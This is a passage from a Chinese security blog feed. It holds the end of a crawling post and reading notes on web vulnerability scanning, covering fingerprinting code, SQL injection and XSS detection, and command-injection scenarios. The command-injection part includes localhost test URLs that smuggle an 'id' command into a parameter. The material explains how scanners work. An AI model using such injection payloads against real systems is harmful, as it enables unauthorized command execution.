—— 灰蓝的博客</a></p><h3 id="4-总结："><a href="#4-总结：" class="headerlink" title="(4)总结："></a><strong>(4)总结：</strong></h3><p><strong>到此，我们介绍了动态页面处理的一些思路：</strong></p><p><strong>1.逆向回溯 :</strong> 该方法属于手工方法，不适合自动检测<br><strong>2.渲染动态页面 :</strong> 使用PySide或ghost.py，但是由于太过久远已经被时代淘汰了，所以这种方法并不优雅<br><strong>3.selenium 模拟浏览器:</strong> 这种方法是现代大型爬虫最常使用的模式</p><h2 id="0X03-参考链接"><a href="#0X03-参考链接" class="headerlink" title="0X03 参考链接"></a><strong>0X03 参考链接</strong></h2><p><a href="https://blog.csdn.net/ha_hha/article/details/80324343" target="_blank" rel="noopener">https://blog.csdn.net/ha_hha/article/details/80324343</a><br><a href="https://blog.csdn.net/ha_hha/article/details/80324582" target="_blank" rel="noopener">https://blog.csdn.net/ha_hha/article/details/80324582</a><br><a href="https://blog.csdn.net/Ha_hha/article/details/80324707" target="_blank" rel="noopener">https://blog.csdn.net/Ha_hha/article/details/80324707</a><br><a href="https://github.com/linbo-lin/dynamic-web-process" target="_blank" rel="noopener">https://github.com/linbo-lin/dynamic-web-process</a><br><a href="https://docs.seleniumhq.org/" target="_blank" rel="noopener">https://docs.seleniumhq.org/</a><br><a href="https://ghost-py.readthedocs.io/en/latest/#" target="_blank" rel="noopener">https://ghost-py.readthedocs.io/en/latest/#</a><br><a href="http://pyside.github.io/docs/pyside/" target="_blank" rel="noopener">http://pyside.github.io/docs/pyside/</a><br><a href="https://huilansame.github.io/huilansame.github.io/" target="_blank" rel="noopener">https://huilansame.github.io/huilansame.github.io/</a><br><a href="https://blog.csdn.net/xiaozhuxmen/article/details/52014901" target="_blank" rel="noopener">https://blog.csdn.net/xiaozhuxmen/article/details/52014901</a><br><a href="http://www.cnblogs.com/lhb25/p/how-browsers-work.html#Resources" target="_blank" rel="noopener">http://www.cnblogs.com/lhb25/p/how-browsers-work.html#Resources</a><br><a href="http://book.sina.com.cn/excerpt/" target="_blank" rel="noopener">http://book.sina.com.cn/excerpt/</a><br><a href="https://blog.csdn.net/u010378313/article/details/51435992" target="_blank" rel="noopener">https://blog.csdn.net/u010378313/article/details/51435992</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;&lt;strong&gt;0x00 前言&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;最近在看类似的问题的时候找了一些资料，发现网上有一篇文章写得很详细(准确的说是分成三篇文章写的)，特别是手工逆向的方式还是挺有趣的，我也照着他的方式尝试了一下，学到一点东西，下面是这三篇文章的部分内容(有删改，外加其它的一些理解),如果想看原文的话，我在本文最后会附上原文的链接，至于目前最流行的使用  chrome headless 写动态爬虫的方法，由于原作者写的也不是很仔细，所以我还要再找些资料仔细研究一下，后面再写一篇文章总结。&lt;/p&gt;
&lt;h2 id=&quot;0X01-动态网页简介：&quot;&gt;&lt;a href=&quot;#0X01-动态网页简介：&quot; class=&quot;headerlink&quot; title=&quot;0X01 动态网页简介：&quot;&gt;&lt;/a&gt;&lt;strong&gt;0X01 动态网页简介：&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;在我们编写爬虫时，可能会碰到以下两种问题：&lt;/p&gt;
    
    </summary>
    
      <category term="备忘" scheme="https://www.k0rz3n.com/categories/%E5%A4%87%E5%BF%98/"/>
    
    
      <category term="爬虫" scheme="https://www.k0rz3n.com/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>《白帽子讲 web 扫描》 阅读记录(下)</title>
    <link href="https://www.k0rz3n.com/2019/03/04/%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2%20web%20%E6%89%AB%E6%8F%8F%E3%80%8B%20%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95(%E4%B8%8B)/"/>
    <id>https://www.k0rz3n.com/2019/03/04/《白帽子讲 web 扫描》 阅读记录(下)/</id>
    <published>2019-03-04T07:02:18.000Z</published>
    <updated>2019-04-28T13:56:38.741Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0X04-应用指纹识别"><a href="#0X04-应用指纹识别" class="headerlink" title="0X04 应用指纹识别"></a><strong>0X04 应用指纹识别</strong></h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a><strong>1.概念</strong></h3><p>应用指纹，其实<strong>是Web 应用的一种身份标识</strong>，具有唯一性。在Web 应用的开发过程中，为了提高开发的效率和系统的稳定性，通常会用到一些成熟、稳定的第三方环境、程序、框架或服务等，而<strong>这些第三方内容的名称或标识就是这里所说的应用指纹。</strong></p><h3 id="2-应用指纹种类及识别"><a href="#2-应用指纹种类及识别" class="headerlink" title="2.应用指纹种类及识别"></a><strong>2.应用指纹种类及识别</strong></h3><p>对于一个简单的Web 应用而言，它所涉及的应用指纹信息非常多，这里为了便于理解和记忆，我们根据网络数据的流向，并结合分层思想，<strong>将常见的应用指纹分成了5 类</strong>， 如下：</p><a id="more"></a><p><strong>(1)网络层指纹</strong><br>网关、防火墙、VPN、CDN、DNS、路由器等基础设施指纹。</p><p><strong>(2)主机层指纹</strong><br>操作系统信息、软件防火墙、主机上各种对外提供服务的软件指纹。</p><p><strong>(3)服务层指纹</strong><br>Web 服务、FTP 服务、SSH 服务等各种对外提供服务的指纹。</p><p><strong>(4)应用层指纹</strong><br>各种建站程序、开源框架、前端框架等。</p><p><strong>(5)语言层指纹</strong><br>各种脚本语言信息， 如： ASP、ASPX、PHP 和JSP 等</p><p>应用指纹识别是通过对目标进行分析和判断，知道它是由哪些应用指纹组成的。举个例子，如果对安全宝的官网<a href="http://www.anquanbao.com进行应用指纹识别，" target="_blank" rel="noopener">www.anquanbao.com进行应用指纹识别，</a> 那么就能获取如下基础信息：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F67.png" alt="此处输入图片的描述"></p><h3 id="3-应用指纹识别技术"><a href="#3-应用指纹识别技术" class="headerlink" title="3.应用指纹识别技术"></a><strong>3.应用指纹识别技术</strong></h3><h4 id="1-获取特征的方式"><a href="#1-获取特征的方式" class="headerlink" title="(1)获取特征的方式"></a><strong>(1)获取特征的方式</strong></h4><p>既然应用指纹的价值如此之大，那么如何去识别和获取呢？首先需要获取指纹的特征，<strong>通常这些指纹特征会存在于特定页面的HTTP响应中，因此可以通过下面三种方式来处理：</strong></p><p><strong>(1)内容特征</strong><br>这类指纹的特征在HTTP 响应的正文中， 通过<strong>对响应正文中的内容进行特征匹配即可识别</strong>。</p><p><strong>(2)页面特征</strong><br>这类指纹在HTTP请求中并没有明显的特征，而页面的内容却相对固定，因此可以<strong>根据页面内容的Hash值进行识别。</strong></p><p><strong>(3)Headers 特征</strong><br>这类指纹会在HTTP响应的消息报头中增加自己的报头信息，因此可以<strong>直接在消息报头中进行识别</strong>。</p><h4 id="2-指纹特征库"><a href="#2-指纹特征库" class="headerlink" title="(2)指纹特征库"></a><strong>(2)指纹特征库</strong></h4><p>按照文件的形式存储</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F68.png" alt="此处输入图片的描述"></p><h4 id="3-功能实现"><a href="#3-功能实现" class="headerlink" title="(3)功能实现"></a><strong>(3)功能实现</strong></h4><p>应用指纹识别主要有三种常见的方式， 因此， 在代码实现中， 需要对这三部分内容进行关键特征匹配识别， 部分核心代码如下：</p><pre><code>class FingerScan:    &apos;&apos;&apos;    &apos;&apos;&apos;    def __init__(self):        &apos;&apos;&apos;        &apos;&apos;&apos;        self._app_file = Settings.FINGER_FILE        #指纹扫描模式:0为根域名扫描；1为自定义路径扫描模式        self._scan_mode=0        self._app_db = open(self._app_file,&quot;rb&quot;).readlines()        self._server_finger = None        self._http_code    = None    def md5(self,content):        &apos;&apos;&apos;        &apos;&apos;&apos;        if isinstance(content,unicode):            content = content.encode(&quot;utf-8&quot;)        else:            content = content        m = hashlib.md5()        try:            m.update(content)            return m.hexdigest()        except:            return None    def set_mode(self,mode):        &apos;&apos;&apos;        &apos;&apos;&apos;        self._scan_mode = mode            #{&quot;wordpress&quot;:{&quot;url&quot;:&quot;/wp-admin.php&quot;,&quot;header&quot;:(&quot;server&quot;:&quot;WAF/2.0&quot;),&quot;md5&quot;:&quot;aaaaaaaaaaa&quot;}}    def scan_finger(self,site):        &apos;&apos;&apos;        &apos;&apos;&apos;        app_name_list = []        for item in self._app_db:            # 注释掉则忽略            if item.startswith(&quot;#&quot;):                continue            dict_item =json.loads(item.strip())            # 将 app 的键链接起来            app_name = &quot;&quot;.join(dict_item.keys()).strip()            # 根据上面得到的键，获取值            app_info = dict_item.get(app_name)            # 因为值也是一个字典，因此要获取这个字典的 url 键对应的值            url = app_info.get(&quot;url&quot;)            # 获取 URL 类对象            urlobj = URL(site)            # 自定义路径扫描            if self._scan_mode==1:                test_url = urlobj.get_uri_string()                if test_url.endswith(&quot;/&quot;):                    target_url = test_url[0:-1] + url                else:                    target_url = test_url + url            # 根路径扫描            else:                test_url   = urlobj.get_netloc()                target_url = urlobj.get_scheme()+&quot;://&quot;+test_url+ url            log.info(target_url)            try:                # 发起请求                res = wcurl.get(target_url)            except:                    continue            # 得到结果            dst_headers  = res.headers            dst_body    = res.body            self._http_code = res.get_code()            try:                self._server_finger = dst_headers[&quot;server&quot;]            except:                pass            if dst_body is None:                continue            # 计算 md5            md5_body = self.md5(dst_body)            key_list = app_info.keys()            if &quot;headers&quot; in key_list:                app_headers     = app_info.get(&quot;headers&quot;)                app_key     = app_headers[0].lower()                app_value     = app_headers[1]                if app_key in dst_headers.keys():                    dst_info = dst_headers.get(app_key)                    result     = re.search(app_value,dst_info,re.I)                    if result:                        if &quot;body&quot; in key_list:                            app_body = app_info.get(&quot;body&quot;)                                            # 进行比较                                            result = re.search(app_body,dst_body,re.I)                                            if result:                                                    app_name_list.append((target_url,app_name))                        else:                            app_name_list.append((target_url,app_name))            elif &quot;body&quot; in key_list:                app_body = app_info.get(&quot;body&quot;)                # 进行比较                result = re.search(app_body,dst_body,re.I)                if result:                    app_name_list.append((target_url,app_name))            elif &quot;md5&quot; in key_list:                app_md5 = app_info.get(&quot;md5&quot;)                # 进行比较                if app_md5 == md5_body:                    app_name_list.append((target_url,app_name))        return app_name_list    def get_server(self):        &apos;&apos;&apos;        &apos;&apos;&apos;        return self._server_finger    def get_code(self):        &apos;&apos;&apos;        &apos;&apos;&apos;        return self._http_codeif __name__==&quot;__main__&quot;:    &apos;&apos;&apos;    &apos;&apos;&apos;    if len(sys.argv)&lt;2:        print &quot;Plz Input Site&quot;        sys.exit()    fs = FingerScan()    print sys.argv[1]    test=fs.scan_finger(sys.argv[1])    print test    for item in test:        print item    print fs.get_server()</code></pre><h2 id="0X05-安全漏洞审计"><a href="#0X05-安全漏洞审计" class="headerlink" title="0X05 安全漏洞审计"></a><strong>0X05 安全漏洞审计</strong></h2><h3 id="1-漏洞审计三部曲"><a href="#1-漏洞审计三部曲" class="headerlink" title="1.漏洞审计三部曲"></a><strong>1.漏洞审计三部曲</strong></h3><p>对于任何一种漏洞的检测或审计，都会遵循下面的流程：</p><p>(1) 需要分析现实中这个漏洞的各种场景。<br>(2) 构造出可以<strong>覆盖所有漏洞场景的扫描载荷</strong>(payload) 。<br>(3) 将其<strong>转化成扫描器的检测脚本</strong>并生成最终的扫描签名。</p><h3 id="2-安全漏洞可以分成两类："><a href="#2-安全漏洞可以分成两类：" class="headerlink" title="2.安全漏洞可以分成两类："></a><strong>2.安全漏洞可以分成两类：</strong></h3><h4 id="1-通用型漏洞："><a href="#1-通用型漏洞：" class="headerlink" title="(1)通用型漏洞："></a><strong>(1)通用型漏洞：</strong></h4><p>具有普遍们大部分应用都会涉及如 SQL 注入漏洞、 XSS 跨站湍洞、命令执行注入或文件包含漏洞等。它们主要是<strong>针对HTTP请求中的输入部分进行测试</strong>的，通过<strong>改变这些输入值就 可以对漏洞进行测试和判定</strong>。</p><h4 id="2-Nday-0day-漏洞："><a href="#2-Nday-0day-漏洞：" class="headerlink" title="(2)Nday/0day 漏洞："></a><strong>(2)Nday/0day 漏洞：</strong></h4><p>具有针对型，通常是指某一类具体应用， 比如：建站应用Discuz 的SQL 注入漏洞、IIS 的远程溢出漏洞或OpenSSL 的心脏出血漏洞等。</p><h3 id="3-通用型漏洞审计"><a href="#3-通用型漏洞审计" class="headerlink" title="3.通用型漏洞审计"></a><strong>3.通用型漏洞审计</strong></h3><h4 id="1-SOL注入漏洞"><a href="#1-SOL注入漏洞" class="headerlink" title="(1)SOL注入漏洞"></a><strong>(1)SOL注入漏洞</strong></h4><p>原理我这里就省略了…</p><h5 id="1-页面比较法"><a href="#1-页面比较法" class="headerlink" title="1.页面比较法"></a><strong>1.页面比较法</strong></h5><p>这种方法比较直观，也易于理解，而且<strong>准确度较高</strong>。 我们可以利用SQL语句来构造 恒真和恒假两种不同状态，如果目标存在 SQL 注入漏洞，那么恒真状态对页面内容的影响并不会产生较大的改变；而恒假状态则会明显地改变页面的内容，通过<strong>页面相似度算法</strong>比较这两个页面的相似程度，就可以判定目标是否存在SQL注入漏洞。</p><blockquote><p><strong>注：</strong> 说到这个页面相似度算法，我就想起了 sqlmap 的一个非常重要的东西： ratio ，这个是 sqlmap 中的重要组件之一，也是一种计算页面相似度的算法，在整个 sqlmap 中占有非常核心的地位</p></blockquote><h5 id="2-时间比较法"><a href="#2-时间比较法" class="headerlink" title="2.时间比较法"></a><strong>2.时间比较法</strong></h5><p>时间比较法主要是<strong>利用时间延迟技术</strong>进行漏洞的判定，虽然Web服务器可以隐藏错误或数 据，但是必定会返回HTTP响应信息， 因此可以向数据库中注入 时间延迟函数。 如果目标存在SQL注入漏洞，那么时间延迟函数就会被执行，服务端的响应时间就会延长，通过与正常服务端的响应时间比较， 可以判定目标是否存在漏洞。</p><h5 id="3-扫描载荷"><a href="#3-扫描载荷" class="headerlink" title="3.扫描载荷"></a><strong>3.扫描载荷</strong></h5><p>现在我们可以对 SQL 注入漏洞的场景进行整理，并给出最终的扫描载荷，扫描器利用它们可以对目标进行SQL注入检测， 如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F69.png" alt="此处输入图片的描述"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F70.png" alt="此处输入图片的描述"></p><h5 id="4-代码实现"><a href="#4-代码实现" class="headerlink" title="4.代码实现"></a><strong>4.代码实现</strong></h5><p>下面我贴出作者写的部分关键代码(GET 方法),并在必要的地方给出了注释方便理解</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F71.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F72.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F73.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F74.png" alt="此处输入图片的描述"></p><h4 id="2-XSS-漏洞"><a href="#2-XSS-漏洞" class="headerlink" title="(2)XSS 漏洞"></a><strong>(2)XSS 漏洞</strong></h4><h5 id="1-概念与区别"><a href="#1-概念与区别" class="headerlink" title="1.概念与区别"></a><strong>1.概念与区别</strong></h5><p>这里简单说一下 反射和 DOM XSS 的区别吧</p><p><strong>反射型 XSS</strong> </p><p>反射性XSS, 其最明显的特征就是恶意数据通常会在链接里，需要受害者的参与，攻击者会将篡改后的链接发送给用户，用户访问这个链接后，恶意脚本会被浏览器执行。</p><p><strong>DOM XSS</strong> </p><p>DOM型XSS, 是基于文档对象模型的一种XSS漏洞，客户端的脚本程序可以通过DOM动态地操作和修改页面内容。<strong>它不依赖于提交数据到服务端(这或许是两者的最大差别了，其实就是会不会与服务器进行交互)</strong>，但如果从客户端获取DOM中的数据没有进行过滤，那么攻击者就可以注入恶意代码，并在浏览器端执行，产生DOM型XSS。</p><h5 id="2-利用场景"><a href="#2-利用场景" class="headerlink" title="2.利用场景"></a><strong>2.利用场景</strong></h5><p>反射型就不说了，然后存储型提一点就是<strong>输入点和输出点一般不在一个页面</strong>，这里说一下 DOM 型吧。</p><p>利用document对象的相关属性来获取前端的输入内容，然后传到eval函数中执行。</p><p><strong>页面代码：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F75.png" alt="此处输入图片的描述"></p><p><strong>前端输入</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F76.png" alt="此处输入图片的描述"></p><p><strong>执行结果</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F77.png" alt="此处输入图片的描述"></p><p><strong>DOM型XSS漏洞常见的输入输出点如下表：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F78.png" alt="此处输入图片的描述"></p><blockquote><p><strong>注意：</strong></p><p>现在主流浏览器都已经增加了对XSS攻击的防护，也就是我们常说的XSSFilter(XSS过滤器），<strong>如Chrome通过内置过滤器XSS-Auditor进行过滤，Firefox通过NoScript扩展支持该功能等</strong>。所以对于一些常用的payload,浏览器都会有相应的干扰策略，它们会阻碍正常的检测与识别。<strong>因此在真实的扫描中，通常需要绕过后才能进行有效的检测。</strong></p></blockquote><h5 id="2-检测原理"><a href="#2-检测原理" class="headerlink" title="2.检测原理"></a><strong>2.检测原理</strong></h5><h6 id="1-反射型XSS"><a href="#1-反射型XSS" class="headerlink" title="(1)反射型XSS"></a><strong>(1)反射型XSS</strong></h6><p>从上面的漏洞场景来看， 反射型XSS漏洞具有明显的输入／输出特点，<strong>而且数据提交的页面和数据输出的页面是同一个</strong>， 因此可以通过构造扫描载荷(payload)进行提交，然后<strong>检查输出的内容</strong>就可以判定目标是否存在反射型XSS漏洞。</p><h6 id="2-存储型XSS"><a href="#2-存储型XSS" class="headerlink" title="(2)存储型XSS"></a><strong>(2)存储型XSS</strong></h6><p>存储型 XSS 与反射型 XSS 的场景基本相同，<strong>只不过存储型会向服务端插入数据</strong>，<strong>如果用户数据提交的页面与输入内容的展示页面相同，那么可以通过对输出内容进行检测来判定</strong>；如果用户数据提交的页面与输入内容的展示<strong>页面不同，这种情况就需要先找到输入内容的展示页面， 并在该页面中进行检测和判定</strong>。</p><h6 id="3-DOM型XSS"><a href="#3-DOM型XSS" class="headerlink" title="(3)DOM型XSS"></a><strong>(3)DOM型XSS</strong></h6><p>与前面两种XSS 漏洞类型不同，DOM 型XSS 是在浏览器的解析中，改变当前页面的DOM树，对于这种交互操作较多的单页面，<strong>可以借助浏览器引擎进行检测</strong>，但如果每一个页面都增加这些交互操作，那么就会严重影响扫描器效率，所以这里暂不实现该类型(<strong>说你个锤子….等我找别的扫描器分析吧…坑</strong>)。</p><p>下面对漏洞场景中的漏洞检测方法进行整理和覆盖，并给出最终的扫描载荷列表。在实际的测试过程中，我们发现<code>&lt;script&gt;</code>标签经常会被一些防护设备作为特征过滤，从而产生干扰，因此在实践中我们用<code>&lt;a&gt;</code>标签作为特征进行检测。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F79.png" alt="此处输入图片的描述"></p><p>最终的扫描载荷可以定义为下列形式：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F80.png" alt="此处输入图片的描述"></p><p>具体的内容如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F81.png" alt="此处输入图片的描述"></p><p>因此， 通过这个扫描载荷就可以覆盖上面描述的所有场景。</p><p>下面是具体的代码实现。由千其他类型的XSS 并不容易在扫描器中进行通用的检测，所以这里主要选择反射型XSS 来实现。根据上述的检测原理， 并结合最终的扫描载荷， </p><p><strong>具体的代码实现如下：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F82.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F83.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F84.png" alt="此处输入图片的描述"></p><blockquote><p><strong>我这里需要稍微解释一下：</strong></p><p>(1)首先我们需应该自定义很多很多带标签的用来 fuzz 的字符串(这里作者由于是 demo<br>于是只定义了一个，实际中是远远不够的)，而且标签可以是<code>&lt;img&gt;</code> <code>&lt;svg&gt;</code> 之类的，不一定是 <code>&lt;a&gt;</code></p><p>(2)那么为什么这个标签最后能在页面中完整返回就说明漏洞可能存在呢？因为完整返回说明了我们能够在页面源码中注入我们的标签，这样我们就有利用的可能</p></blockquote><h4 id="3-命令执行漏洞"><a href="#3-命令执行漏洞" class="headerlink" title="(3)命令执行漏洞"></a><strong>(3)命令执行漏洞</strong></h4><h5 id="1-概念与原理"><a href="#1-概念与原理" class="headerlink" title="1.概念与原理"></a><strong>1.概念与原理</strong></h5><p>通常情况下，如果Web应用程序需要执行系统命令，那么开发人员会将客户端获取的数据直接传递给具有执行系统命令功能的函数中， 如： system、exec、shell_exec等。如果没有对客户端的数据进行过滤就产生命令执行注入漏洞，那么攻击者可以通过命令注入来执行额外的命令，从而达到攻击的效果。</p><h5 id="2-利用场景-1"><a href="#2-利用场景-1" class="headerlink" title="2.利用场景"></a><strong>2.利用场景</strong></h5><h6 id="场景一"><a href="#场景一" class="headerlink" title="场景一"></a><strong>场景一</strong></h6><p>将前端获取的变量<strong>直接与命令语句进行拼接，然后代入命令执行函数中</strong>，这里以Linux操作系统为例说明。</p><p><strong>后端代码：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F85.png" alt="此处输入图片的描述"></p><p>从上面的代码中可以看到， 由千变量位千语句的最后面， 因此可以利用 Linux 中的 些特殊符号完成命令的注入。在构造扫描载荷 (payload) 之前， 先来看看这些特殊符号的作用， 如下：</p><p><strong>1.管道符号(|)</strong><br>可以连接多个命令，它会把第一个命令command1 执行的结果作为第二个命令command2 的输入传给command2 并执行。</p><p><strong>2.连接符号(;)</strong><br>可以连接多个命令， 它会依次顺序地执行这些命令。</p><p><strong>3.逻辑与符号(&amp;&amp;)</strong><br>可以连接多个命令， 只有第一个命令执行成功， 才会执行第二个命令。</p><p><strong>4.逻辑或符号 (||)</strong><br>可以连接多个命令， 只有第一个命令执行失败， 才会执行第二个命令；否则不会执行第二个命令。</p><p>上面所介绍的符号都可以用来连接多个命令，根据每个符号的特点， 可构造对应的扫描载荷(payload)。</p><p><strong>前端输入:</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F86.png" alt="此处输入图片的描述"></p><p>访问链接 <a href="http://localhost/book/cmd/1_cmd.php?data=test;id" target="_blank" rel="noopener">http://localhost/book/cmd/1_cmd.php?data=test;id</a>;</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F87.png" alt="此处输入图片的描述"></p><p>从上面的效果截图中可以看到，程序除了成功执行ls命令外，还执行了额外的id命令，从而成功完成命令执行注入攻击。</p><h6 id="场景二"><a href="#场景二" class="headerlink" title="场景二"></a><strong>场景二</strong></h6><p>将前端获取的变量通过单引号或双引号，代入命令执行函数中 </p><p><strong>后端代码：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F88.png" alt="此处输入图片的描述"></p><p>由于<strong>可控变量在单引号之间</strong>，所以<strong>需要先对单引号进行闭合</strong>，然后再利用分号的特性进行后续的命令注入， 因此可以构造如下的payload进行检测</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F89.png" alt="此处输入图片的描述"></p><p>访问链接 <a href="http://localhost/book/cmd/2_cmd.php?data=test&#39;;id;&#39;" target="_blank" rel="noopener">http://localhost/book/cmd/2_cmd.php?data=test&#39;;id;&#39;</a></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F90.png" alt="此处输入图片的描述"></p><h6 id="场景三"><a href="#场景三" class="headerlink" title="场景三"></a><strong>场景三</strong></h6><p>将用户的输入赋值给某个变量</p><p><strong>后端代码：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F91.png" alt="此处输入图片的描述"></p><p>在对场景3进行分析之前， 我们需要先来了解一下PHP的一些特性。在PHP中， <strong>字符串的定义可以使用单引号， 也可以使用双引号。</strong> </p><blockquote><p><strong>它们的区别是：</strong><br>双引号串中的变扯将被解析而且替换，而单引号串中的内容总被认为是普通字符，不具备任何解析功能。</p></blockquote><p>下面分别对<strong>可变变量</strong>、 <strong>可变函数</strong>和<strong>print函数</strong>进行讲解</p><p><strong>1.可变变量：</strong></p><p>PHP中提供了一种其他类型的变量， 称之为可变变量。就是说， <strong>一个变量的变量名可以动态设置和使用</strong>。例如一个普通的变量通过声明来设置， 如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F92.png" alt="此处输入图片的描述"></p><p>一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。在上面的例子中，hello 使用了两个美元符号（＄）以后， 就可以作为一个可变变量的变最了， 如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F93.png" alt="此处输入图片的描述"></p><p>这时， 我们会发现这里定义了两个变量：变量<code>$a</code> 的内容是”hello” , 并且变量<code>$hello</code> 的内容是”world”。也可以用下面的语句来定义， 它们的效果是一致的， 如：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F94.png" alt="此处输入图片的描述"></p><p>这里使用<code>&quot;${$a}&quot;</code> 来替换<code>&quot;$$a&quot;</code> 主要利用大括号在变量间接引用中进行定界， 避免歧义。</p><p><strong>2.可变函数</strong></p><p>PHP同时也支持可变函数。这意味着如果一个变量名后有圆括号，PHP将寻找与变量的值同名的函数，并且尝试执行它。例如：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F95.png" alt="此处输入图片的描述"></p><p>代码中的<code>&quot;$a()&quot;</code> 属于可变函数， 结合可变变量的用法， 这里以函数来替换变量， 即为：<code>${print(md5(imiyoo))}</code>。这样就可以执行print()函数了。由千print函数比较特殊， 这里有必要说明一下。</p><p><strong>3.print函数</strong></p><p><strong>print 函数实际上不是一个真正意义上的函数，而是一个语言结构</strong>，因此它可以不必使用括<br>号。但由千它具备函数的形式， 所以也可以使用带括号的形式。写成如下的形式也是可以的：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F96.png" alt="此处输入图片的描述"></p><p>那么现在针对场景三， 我们可以构造如下的语句进行测试。</p><p><strong>前端输入：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F97.png" alt="此处输入图片的描述"></p><p>访问链接 <a 